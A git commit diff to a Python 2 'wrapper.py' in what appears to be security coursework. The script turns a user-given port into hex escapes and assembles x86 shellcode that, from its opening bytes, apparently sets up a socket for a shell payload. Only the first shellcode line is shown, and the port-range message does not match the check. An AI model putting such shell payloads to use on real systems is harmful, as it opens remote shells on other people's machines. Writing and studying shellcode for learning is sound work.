6e2582f5eab149ec068e318743b679cfbb2b4f68
RawrRadioMouse <55473161+RawrRadioMouse@users.noreply.github.com>
2020-06-17 09:23:34 +0930

    Update wrapper.py

--- Assignment_1/wrapper.py
+++ Assignment_1/wrapper.py
@@ -13,7 +13,7 @@ port = int(sys.argv[1])
 if (port < 1024 or port > 65535):
 	print "[!] {} not a valid port, must be between 0-65535!".format(port) #tell people off for being silly
 	exit()
-port = hex(port)[2:] # slice out the preceeding "0x" before the hex output
+port = hex(port)[2:] # convert port val to hex, and slice out the preceeding "0x" before the hex output
 port = '\\x'+str(port[0:2]) + '\\x'+str(port[2:4]) # further break up hex output and place our "\\x" in front of each hex val		
 shellcode = ""
 shellcode += "\\x31\\xc0\\x50\\x6a\\x01\\x6a\\x02\\x31\\xc9\\x89\\xe1\\xb0"
